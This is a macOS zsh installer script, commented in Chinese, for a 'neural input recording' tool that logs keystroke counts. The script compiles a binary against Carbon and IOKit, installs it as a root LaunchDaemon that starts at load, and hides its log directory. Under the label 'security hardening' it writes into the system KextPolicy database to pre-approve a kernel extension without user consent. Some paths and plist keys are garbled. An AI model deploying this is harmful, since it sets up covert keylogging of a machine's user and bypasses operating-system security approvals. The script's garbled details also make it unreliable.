#!/usr/bin/env zsh
# 文件名：neurosetup.sh
# 全自动配置神经输入记录工具

set -e  # 遇到错误立即退出

# 配置参数
APP_NAME="neuroinput"
INSTALL_DIR="/usrsudo/local/neuro"
LOG_DIR="/var/log/neuroinput"
PLIST_PATH="/Library/LaunchDaemons/com.nerurldev.neuroinput.plist"

# 检查是否为ARM架构
if [[ $(uname -m) != "arm64" ]]; then
    echo "错误：本工具仅支持Apple Silicon芯片（M1/M2）"
    exit 1
fi

# 安装Homebrew（如果未安装）
if ! command -v brew &> /dev/null; then
    echo "安装Homebrew..."
    /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
    echo 'eval "$(/opt/homebrew/bin/brew shellenv)"' >> ~/.zprofile
    eval "$(/opt/homebrew/bin/brew shellenv)"
fi

# 安装依赖
echo "安装编译依赖..."
brew install sqlite3 cmake
sudo xcode-select --install || true  # 忽略已安装情况

# 创建安装目录
sudo mkdir -p $INSTALL_DIR $LOG_DIR
sudo chown $USER:admin $INSTALL_DIR

# 克隆源码并编译（此处替换为实际代码库）
echo "编译神经输入记录器..."
git clone https://github.com/nerurldev/neuroinput.git $INSTALL_DIR/src
cd $INSTALL_DIR/src

# 针对M2优化编译
export CFLAGS="-mcpu=apple-m1 -O3"
clang $CFLAGS -framework Carbon -framework IOKit \
      -I/opt/homebrew/opt/sqlite3/include \
      -L/opt/homebrew/opt/sqlite3/lib \
      -lsqlite3 neuroinput.c -o $APP_NAME

# 部署可执行文件
sudo mv $APP_NAME /usr/local/bin/
sudo chmod 755 /usr/local/bin/$APP_NAME

# 配置日志权限
sudo chown root:wheel $LOG_DIR
sudo chmod 770 $LOG_DIR
sudo chflags hidden $LOG_DIR  # 隐藏日志目录

# 创建系统守护进程
echo "<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">
<plist version=\"1.0\">
<dict>
    <key>Label</key>
    <string>com.nerurldev.neuroinput</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/local/bin/neuroinput</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>StandardOutPath</key>
    <string>$LOG_DIR/service.log</string>
    <key>StandardErrorPath</key>
    <string>$LOG_DIR/error.log</string>
    <key>HardwareCapabilities</key>
    <array>
        <string>com.apple.security.arm64</string>
    </array>
</dict>
</plist>" | sudo tee $PLIST_PATH > /dev/null

# 加载服务
sudo launchctl load -w $PLIST_PATH

# 安全加固
echo "配置系统权限..."
sudo sqlite3 /var/db/SystemPolicyConfiguration/KextPolicy \
    "INSERT OR REPLACE INTO kext_policy VALUES ('com.nerurldev.driver', 1, 1, 0, 'UNKNOWN', 'XYZ12345', 'TeamID', 0);"

echo "✅ 安装完成！服务已作为守护进程运行"
echo "查看统计：sqlite3 $LOG_DIR/keystats.db \"SELECT keycode, SUM(count) FROM stats GROUP BY keycode;\""